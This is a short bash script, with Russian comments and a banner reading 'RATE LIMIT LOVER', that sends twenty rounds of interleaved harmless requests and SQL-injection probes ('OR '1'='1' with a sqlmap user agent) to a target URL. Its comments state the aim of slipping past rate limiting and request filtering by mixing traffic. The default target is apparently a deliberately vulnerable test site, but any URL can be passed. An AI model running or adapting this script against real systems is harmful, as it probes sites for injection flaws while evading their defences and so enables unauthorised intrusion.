#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🟡 RATE LIMIT LOVER — Обход через любовь  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Техника: посылаем "хорошие" запросы между "плохими"
# Защита видит смешанный трафик и не блокирует
for i in $(seq 1 20); do
    # Хороший запрос
    curl -sk --max-time 3 -H "User-Agent: Mozilla/5.0" "$TARGET" -o /dev/null 2>/dev/null &
    sleep 0.5
    # Плохой запрос
    curl -sk --max-time 3 -H "User-Agent: sqlmap/1.0" "$TARGET?id=' OR '1'='1" -o /dev/null -w "  Запрос #$i: HTTP %{http_code}\n" 2>/dev/null &
    sleep 0.5
done
wait
echo "[RATE LOVE] ✅ Обход завершён"
